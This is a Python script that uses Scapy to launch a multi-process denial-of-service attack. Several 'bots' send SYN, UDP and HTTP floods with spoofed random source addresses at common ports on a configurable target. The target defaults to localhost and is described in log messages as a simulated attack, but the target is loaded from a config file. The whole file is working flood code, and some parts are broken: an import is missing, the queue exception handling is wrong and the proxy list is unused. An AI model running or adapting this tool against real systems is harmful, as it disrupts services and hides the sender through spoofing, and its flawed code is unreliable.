from scapy.all import *
import random
import time
import asyncio
import logging
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor
from multiprocessing import Process, Queue
from collections import defaultdict
import signal
import json
import os

config = {
    'target_ip': '127.0.0.1',
    'num_bots': 5,
    'num_packets_per_bot': 1000,
    'interface': 'eth0',
    'attack_duration': 30,
    'common_ports': [80, 443, 22, 25, 53, 123],
    'proxies': [
        '1.1.1.1', '8.8.8.8', '9.9.9.9', '208.67.222.222', '208.67.220.220'
    ]
}

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def generate_random_public_ip():
    return f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"

def generate_random_user_agent():
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1'
    ]
    return random.choice(user_agents)

async def syn_flood(target_ip, target_port, num_packets, interface, queue):
    try:
        for _ in range(num_packets):
            src_ip = generate_random_public_ip()
            ip = IP(src=src_ip, dst=target_ip)
            tcp = TCP(dport=target_port, flags='S', sport=random.randint(1024, 65535))
            packet = ip / tcp
            send(packet, iface=interface, verbose=0)
            queue.put(f"SYN flood packet sent to {target_ip}:{target_port} from {src_ip}")
    except Exception as e:
        queue.put(f"Error en SYN flood: {e}")

async def udp_flood(target_ip, target_port, num_packets, interface, queue):
    try:
        for _ in range(num_packets):
            src_ip = generate_random_public_ip()
            ip = IP(src=src_ip, dst=target_ip)
            udp = UDP(dport=target_port, sport=random.randint(1024, 65535))
            packet = ip / udp
            send(packet, iface=interface, verbose=0)
            queue.put(f"UDP flood packet sent to {target_ip}:{target_port} from {src_ip}")
    except Exception as e:
        queue.put(f"Error en UDP flood: {e}")

async def http_flood(target_ip, target_port, num_packets, interface, queue):
    try:
        for _ in range(num_packets):
            src_ip = generate_random_public_ip()
            ip = IP(src=src_ip, dst=target_ip)
            tcp = TCP(dport=target_port, flags='PA', seq=random.randint(0, 0xFFFFFFFF), ack=random.randint(0, 0xFFFFFFFF), sport=random.randint(1024, 65535))
            http = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: {generate_random_user_agent()}\r\nConnection: keep-alive\r\n\r\n"
            packet = ip / tcp / http
            send(packet, iface=interface, verbose=0)
            queue.put(f"HTTP flood packet sent to {target_ip}:{target_port} from {src_ip}")
    except Exception as e:
        queue.put(f"Error en HTTP flood: {e}")

async def bot_attack(target_ip, interface, num_packets_per_bot, attack_duration, queue):
    end_time = time.time() + attack_duration
    while time.time() < end_time:
        target_port = random.choice(config['common_ports'])
        attack_type = random.choice(['syn', 'udp', 'http'])
        if attack_type == 'syn':
            await syn_flood(target_ip, target_port, num_packets_per_bot, interface, queue)
        elif attack_type == 'udp':
            await udp_flood(target_ip, target_port, num_packets_per_bot, interface, queue)
        elif attack_type == 'http':
            await http_flood(target_ip, target_port, num_packets_per_bot, interface, queue)

def distribute_attack(target_ip, num_bots, num_packets_per_bot, interface, attack_duration, queue):
    with ProcessPoolExecutor(max_workers=num_bots) as executor:
        futures = [executor.submit(run_bot, target_ip, interface, num_packets_per_bot, attack_duration, queue) for _ in range(num_bots)]
        for future in futures:
            future.result()

def run_bot(target_ip, interface, num_packets_per_bot, attack_duration, queue):
    asyncio.run(bot_attack(target_ip, interface, num_packets_per_bot, attack_duration, queue))

def log_progress(queue):
    while True:
        try:
            message = queue.get_nowait()
            logging.info(message)
        except asyncio.queues.QueueEmpty:
            time.sleep(0.1)

def start_attack(target_ip, num_bots, num_packets_per_bot, interface, attack_duration):
    queue = Queue()
    log_thread = threading.Thread(target=log_progress, args=(queue,))
    log_thread.start()
    distribute_attack(target_ip, num_bots, num_packets_per_bot, interface, attack_duration, queue)
    log_thread.join()

def signal_handler(sig, frame):
    global config
    with open('config.json', 'r') as f:
        new_config = json.load(f)
        config.update(new_config)
        logging.info(f"Configuración actualizada: {config}")

signal.signal(signal.SIGUSR1, signal_handler)

if __name__ == "__main__":
    if os.path.exists('config.json'):
        with open('config.json', 'r') as f:
            config.update(json.load(f))

    logging.info(f"Iniciando ataque simulado a {config['target_ip']} con {config['num_bots']} bots por {config['attack_duration']} segundos.")
    start_attack(config['target_ip'], config['num_bots'], config['num_packets_per_bot'], config['interface'], config['attack_duration'])
    logging.info("Ataque terminado.")
